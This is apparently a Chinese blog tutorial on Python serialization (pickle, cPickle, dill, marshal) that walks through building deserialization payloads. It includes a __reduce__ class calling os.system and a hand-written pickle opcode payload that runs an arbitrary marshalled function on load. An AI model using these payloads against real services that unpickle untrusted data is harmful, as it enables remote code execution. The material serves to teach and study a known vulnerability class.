### 前言
- 序列化 (Serialization)是将对象的状态信息转换为可以存储或传输的形式的过程。在序列化期间，对象将其当前状态写入到临时或持久性存储区。以后，可以通过从存储区中读取或反序列化对象的状态，重新创建该对象
- 为了传输的方便以及可能存在的编码问题，绝大多数可以构建web应用的编程语言都支持序列化。
- Python也不例外，这次浅析Python是怎么序列化和反序列化，以及怎么构造payload。
---
### Python序列化模块
- [Pickle](https://docs.python.org/3/library/pickle.html#relationship-to-other-python-modules)
    - 该模块实现了用于序列化和反序列化Python对象结构的二进制协议
- [cPickle](https://docs.python.org/3/library/pickle.html#relationship-to-other-python-modules)
    - cPickle是Pickle的c语言编译版本，支持Python2和Python3
- [Dill](https://pypi.org/project/dill/)
    - Dill扩展了python的pickle模块，用于将python对象序列化和反序列化为大多数内置python类型。
- [marshal](https://docs.python.org/3/library/marshal.html)
    - 该模块包含可以二进制格式读写Python值的函数
---

### 模块安全性
我列举了四个模块（可能还有更多），其实重点只有两个模块Pickle和marshal。在两个模块的文档首页，都有一个红框Warning
```text
Warning： The marshal module is not intended to be secure against erroneous or maliciously constructed data. Never unmarshal data received from an untrusted or unauthenticated source.

Warning： The pickle module is not secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source.
```
可见其具有很大的威胁。
简单的说，只要序列化变量可控，妥妥的**任意命令执行**。

---

### 举例
主要使用cPickle，因为Pickle打印出来的序列化字符串是二进制，cPickle是一段英文字符串（堆栈语言），更适合学习。

先
```python
import cPickle
```
写一个类
```python
import cPickle

class Test(object):
    name = 'Playwi0'
    blog_url = 'http://www.playwi0.cn'
    def echo(self):
        print self.name + "'s blog url is" + self.blog_url
```
实例化，使用cPickle.dumps(cPickle.dump将对象写入对象文件，dumps是返回一个序列化字符串)得到序列化字符串
```python
import cPickle

class Test(object):
    name = 'Playwi0'
    blog_url = 'http://www.playwi0.cn'
    def echo(self):
        print self.name + "'s blog url is " + self.blog_url

test = Test()
print cPickle.dumps(test)
```
输出内容
```python
ccopy_reg
_reconstructor
p1
(c__main__
Test
p2
c__builtin__
object
p3
NtRp4
.
```
使用cPickle.loads(cPickle.load是从对象文件中引入对象，loads时从字符串中引入对象)将这个字符串反序列化回来
```python
import cPickle

class Test(object):
    name = 'Playwi0'
    blog_url = 'http://www.playwi0.cn'
    def echo(self):
        print self.name + "'s blog url is " + self.blog_url

test = Test()
str = cPickle.dumps(test)
new_test = cPickle.loads(str)
new_test.echo()
```
输出
```string
Playwi0's blog url is http://www.playwi0.cn
```
当然，marshal也可以这样做，但它有一个另一个强大的功能。**它可以序列化函数**。
```python
import marshal,base64

def echo():
    print "Playwi0's blog url is http://www.playwi0.cn"

test = echo
print base64.b64encode(marshal.dumps(test.func_code))
# test.func_code是获取函数的信息
# 输出有乱码，base64加密一下
```
输出
```base64
YwEAAAABAAAAAQAAAEMAAABzCQAAAGQBAEdIZAAAUygCAAAATnMrAAAAUGxheXdpMCdzIGJsb2cgdXJsIGlzIGh0dHA6Ly93d3cucGxheXdpMC5jbigAAAAAKAEAAAB0BAAAAHNlbGYoAAAAACgAAAAAcxgAAAAvaG9tZS9wbGF5d2luL3B5L3Rlc3QucHl0BAAAAGVjaG8DAAAAcwIAAAAAAQ==
```
反序列化回来就有点差别,不仅仅需要loads，还需要一点动态定义函数的知识
```python
import marshal,base64
import types

def echo():
    print "Playwi0's blog url is http://www.playwi0.cn"

test = echo
str = base64.b64encode(marshal.dumps(test.func_code))
new_test = marshal.loads(base64.b64decode(str))
# new_test()这样就会出现TypeError: 'code' object is not callable
# 我们还需要回调函数
(types.FunctionType(new_test, globals(), ''))()
# 第一个参数时为code，函数信息
# 第二个是字典，globals()是返回全局，也可以随意加入一个字典，其他参数可选
# 具体请搜 ‘python动态定义函数’
```
同理也可以使用**types.classobj**来定义类，不过没必要。

到这，Dill可以登场了，Dill集合了动态定义函数的步骤，直接可以使用，只支持python3
```python
import dill

def echo():
    print("Playwi0's blog url is http://www.playwi0.cn")

s = dill.dumps(echo)
dill.loads(s)()
```
输出
```text
Playwi0's blog url is http://www.playwi0.cn
```
---
### 任意代码执行
Pickle允许任意对象去定义一个__reduce__方法来申明怎么序列化这个对象。任意代码就重这里开始。

看一下reduce怎么用
```python
reduce(function, iterable[, initializer])
```
构造恶意类
```python
import cPickle,os

class Test(object):
    name = 'playwi0'
    gender = 'boy'
    def __reduce__(self):
        return os.system,('echo playwi0',)

test = Test()
s = cPickle.dumps(test)
print s
```
输出可以看到name，gender这些变量全没了，只剩__reduce__中的了
```pickle
cposix
system
p1
(S'echo playwi0'
p2
tp3
Rp4
.
```
反序列化执行
```python
cPcikle.loads(s)
```
输出
```python
playwi0
```
如果开头没有**import os**也是可以执行的，因为cPickle.loads会自动尝试引入未引入的module。

python2构造类时需要继承object，就是**class xx(object)**，在括号中加入object，不然有可能一些类的方法用不了，具体可以搜新式类和旧式类

函数也是可以执行任意代码的
```python
import marshal,base64

def echo():
    os.system("echo Playwi0's blog url is http://www.playwi0.cn")

test = echo
str = base64.b64encode(marshal.dumps(test.func_code))
print str
```
输出
```base64
YwAAAAAAAAAAAgAAAEMAAABzEQAAAHQAAGoBAGQBAIMBAAFkAABTKAIAAABOczAAAABlY2hvIFBsYXl3aTAncyBibG9nIHVybCBpcyBodHRwOi8vd3d3LnBsYXl3aTAuY24oAgAAAHQCAAAAb3N0BgAAAHN5c3RlbSgAAAAAKAAAAAAoAAAAAHMYAAAAL2hvbWUvcGxheXdpbi9weS90ZXN0LnB5dAQAAABlY2hvBAAAAHMCAAAAAAE=
```
但要要是想通过Pickle执行，我们还需要下面的知识

---
### Pickle code
pickle其实是一门stack语言，它有不同的几种编写方式，如果我们来编写，一般是使用protocol=0的方式来写。我们在编译的时候也是可以指定protocol，默认为0.

在更底层，其实是Python虚拟机PVM的作用（感兴趣可以去搜）

PVM有很多操作码，在这贴出几个重要的
```pickle
c：读取新的一行作为模块名module，读取下一行作为对象名object，然后将module.object压入到堆栈中。
(：将一个标记对象插入到堆栈中。为了实现我们的目的，该指令会与t搭配使用，以产生一个元组。
t：从堆栈中弹出对象，直到一个“(”被弹出，并创建一个包含弹出对象（除了“(”）的元组对象，并且这些对象的顺序必须跟它们压入堆栈时的顺序一致。然后，该元组被压入到堆栈中。
S：读取引号中的字符串直到换行符处，然后将它压入堆栈。
R：将一个元组和一个可调用对象弹出堆栈，然后以该元组作为参数调用该可调用的对象，最后将结果压入到堆栈中。
.：结束程序。
```
这样看对新手来说，可能就是天书，换一种粗浅的表达（可能有误），那下面一串代码做列子
```python
(types.FunctionType(marshal.loads('%s'),globals(),''))()
# Pickle code
ctypes
FunctionType
(cmarshal
loads
(cbase64
b64decode
(S'%s'
tRtRc__builtin__
globals
(tRS''
tR(tR.
```
从左到右，从上到下
```python
c：引入一个模块，c后面跟着module，object在下一行。如下
ctypes          #import types
FunctionType    #types.FunctionType

(:相当于左括号，就是‘(’,注意后面不能为空，除非结束。如下
ctypes          
FunctionType    #一个module完毕，开始换行
（cmarshal      #types.FunctionType(marshal.loads
loads
(              #types.FunctionType(marshal.loads(

S：后面跟着一个字符串，一般是()里面内容，单引号包起来，输入完要换行。如下
ctypes          
FunctionType    
（cmarshal      
loads
(S‘%s’          # types.FunctionType(marshal.loads('%s'
                # %s格式化，在最后面会接上反序列化内容，替换%s 

t：相当于右括号，就是‘)’。后面一般跟着R。
R：相当执行命令，执行它与前面最近的一个c之间的内容,后面不为空，除非结束。
ctypes          
FunctionType    
（cmarshal      
loads
(S‘%s’
tRc__builtin__   # __builtin__，python导入模块，我们平时默认使用一些函数与它有关
globals          
(tRS''           # types.FunctionType(marshal.loads('%s'),globals(),''
tR(tR            # (types.FunctionType(marshal.loads('%s'),globals(),''))()

.：表示结束
ctypes          
FunctionType    
（cmarshal      
loads
(S‘%s’
tRc__builtin__   
globals          
(tRS''           
tR(tR.

到这就完结
```
完整payload
```python
s = """ctypes
FunctionType
(cmarshal
loads
(cbase64
b64decode
(S'%s'
tRtRc__builtin__
globals
(tRS''
tR(tR."""%base64.b64encode(marshal.dumps(function.func_code))
```
这样再反序列化，就可以执行
```python
cPickle.loads(s)
```
因为实际开发用的可能是pickle，pickle.loads可以直接反序列化对象，所以types.classobj很少用

这里用到的思路都是动态定义函数，所以同类型里，python依旧有很多类似的函数，可供君使用。（查文档）

到这，我们可以随意构造恶意函数了，达到任意代码执行的结果

### 参考文章
- https://xz.aliyun.com/t/2289
- https://www.tttang.com/archive/1294/
- https://zhuanlan.zhihu.com/p/25981037
- http://www.sohu.com/a/274879579_729271
